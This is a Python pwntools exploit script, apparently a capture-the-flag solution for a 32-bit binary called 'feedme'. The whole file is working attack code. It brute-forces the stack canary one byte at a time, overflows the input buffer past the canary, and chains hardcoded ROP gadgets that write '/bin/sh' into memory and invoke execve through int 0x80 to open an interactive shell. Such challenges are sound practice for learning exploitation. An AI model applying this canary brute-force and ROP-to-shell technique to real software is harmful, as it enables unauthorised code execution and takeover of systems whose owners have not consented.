from pwn import *

s = process("./feedme")
def canary_bruteforce():
    canary = '\x00'
    hex_canary = "00"
    input_size = 0x22	# offset from our input buffer to canary is 0x20, +1 null byte we already knew, +1 for our current character
    for i in range(1,4):
        for ch in range(0,0xff):

            #sendline doesn't work for some reason
            s.send(chr(input_size)) # the program takes the ASCII code of our input
            payload = "0"*0x20 + canary + chr(ch)
            s.send(payload)
			
            reply = s.recvuntil("exit.")
            if "YUM" in reply:
                canary += chr(ch)
                #print(canary)
                new_canary = hex(ch)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                #log.info("Found character: {} - New canary: {}".format(chr(ch), canary))
                input_size += 1
                print("Found byte {} - Current canary: {}".format(i, hex_canary))
                break

    return canary,hex_canary

log.info("Bruteforcing canary...")
canary,hex_canary = canary_bruteforce()
print("Canary in hex: 0x" + hex_canary)


# ROPgadget --binary feedme | grep "pop eax ; ret"

pop_eax_ret = 0x080bb496
pop_edx_ret = 0x0806f34a
mov_to_eax = 0x0807be31             # mov dword ptr [eax], edx ; ret
bin_sh = 0x080e9bbb
pop_ecx_pop_ebx_ret = 0x0806f371
int_0x80 = 0x08049761

rop = ""
#----------------- Write first half of /bin/sh\x00 ----------------------
rop += p32(pop_eax_ret)
rop += p32(bin_sh)
rop += p32(pop_edx_ret)
rop += p32(0x6e69622f)              # /bin in little endian
rop += p32(mov_to_eax)

#----------------- Write second half of /bin/sh\x00 ---------------------
rop += p32(pop_eax_ret)
rop += p32(bin_sh+4)
rop += p32(pop_edx_ret)
rop += p32(0x0068732f)              # /sh\x00 in little endian
rop += p32(mov_to_eax)

#----------------- Calling execve("/bin/sh\x00", 0, 0) -----------------
rop += p32(pop_eax_ret)
rop += p32(0xb)                          # syscall number for execve
rop += p32(pop_ecx_pop_ebx_ret)         
rop += p32(0x0)                     # 0 goes to ecx
rop += p32(bin_sh)                  # /bin/sh\x00 address goes to ebx
rop += p32(pop_edx_ret)
rop += p32(0x0)
rop += p32(int_0x80)

payload = "A"*32 + canary + "A"*12      # our input is 32+4+12 bytes away from EIP
payload += rop 

s.send(chr(len(payload)))
s.send(payload)

s.interactive()

